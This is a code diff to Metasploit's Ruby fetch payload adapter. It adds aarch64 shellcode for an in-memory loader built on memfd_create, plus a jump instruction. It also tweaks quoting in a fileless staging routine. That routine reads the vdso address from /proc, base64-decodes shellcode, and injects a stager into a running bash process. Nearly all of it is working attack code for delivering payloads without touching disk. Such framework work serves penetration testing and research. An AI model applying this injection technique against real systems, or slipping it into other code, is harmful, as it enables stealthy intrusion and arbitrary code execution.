@@ -258,6 +258,9 @@ module Msf::Payload::Adapter::Fetch
       )
       payload = Metasm::Shellcode.assemble(Metasm::X64.new, in_memory_loader_asm).encode_string
     when 'x86'
+      # fd = memfd_create()
+      # ftruncate(fd, null)
+      # pause()
       in_memory_loader_asm= %(
         xor ecx, ecx
         push ecx
@@ -274,7 +277,26 @@ module Msf::Payload::Adapter::Fetch
       )
       payload = Metasm::Shellcode.assemble(Metasm::X86.new, in_memory_loader_asm).encode_string
     when 'aarch64'
-      puts 'Not implemented yet'
+      # fd = memfd_create()
+      # ftruncate(fd, null)
+      # pid = getpid()
+      # kill(pid,SIGSTOP)
+      in_memory_loader_asm = [
+                  0x0a0080d2, #0x1000:	mov	x10, #0	0x0a0080d2
+                  0xea0300f9, #0x1004:	str	x10, [sp]	0xea0300f9
+                  0xe0030091, #0x1008:	mov	x0, sp	0xe0030091
+                  0x210080d2, #0x100c:	mov	x1, #1	0x210080d2
+                  0xe82280d2, #0x1010:	mov	x8, #0x117	0xe82280d2
+                  0x010000d4, #0x1014:	svc	#0	0x010000d4
+                  0xc80580d2, #0x1018:	mov	x8, #0x2e	0xc80580d2
+                  0x010000d4, #0x101c:	svc	#0	0x010000d4
+                  0x881580d2, #0x1020:	mov	x8, #0xac	0x881580d2
+                  0x010000d4, #0x1024:	svc	#0	0x010000d4
+                  0x610280d2, #0x1028:	mov	x1, #0x13	0x610280d2
+                  0x281080d2, #0x102c:	mov	x8, #0x81	0x281080d2
+                  0x010000d4, #0x1030:	svc	#0	0x010000d4
+      ]
+      payload = in_memory_loader_asm.pack("N*")
     when 'armle'
       puts 'Not implemented yet'
     when 'armbe'
@@ -301,9 +323,11 @@ module Msf::Payload::Adapter::Fetch
     #
     case module_info['AdaptedArch']
     when 'x64'
-      %^48b8"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0^
+      %^"48b8"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
     when 'x86'
-      %^b8"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0^
+      %^"b8"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
+    when 'aarch64'
+      %^"4000005800001fd6"$(endian $(printf %016x $vdso_addr))^
     else
       fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
     end
@@ -313,7 +337,7 @@ module Msf::Payload::Adapter::Fetch
   # New idea: use /proc/*/mem to write shellcode stager into bash process and create anonymous handle on-fly, then search for that handle and use same approach as original idea
   def _generate_fileless(get_file_cmd)
     stage_cmd = %<vdso_addr=$((0x$(grep -F "[vdso]" /proc/$$/maps | cut -d'-' -f1)));>
-    stage_cmd << %(jmp="#{_generate_jmp_instruction}";)
+    stage_cmd << %(jmp=#{_generate_jmp_instruction};)
     stage_cmd << "sc=$(base64 -d <<< #{_generate_first_stage_shellcode});"
     stage_cmd << %<jmp=$(printf $jmp | sed 's/\\([0-9A-F]\\{2\\}\\)/\\\\x\\1/gI');>
     stage_cmd << 'read syscall_info < /proc/self/syscall;'
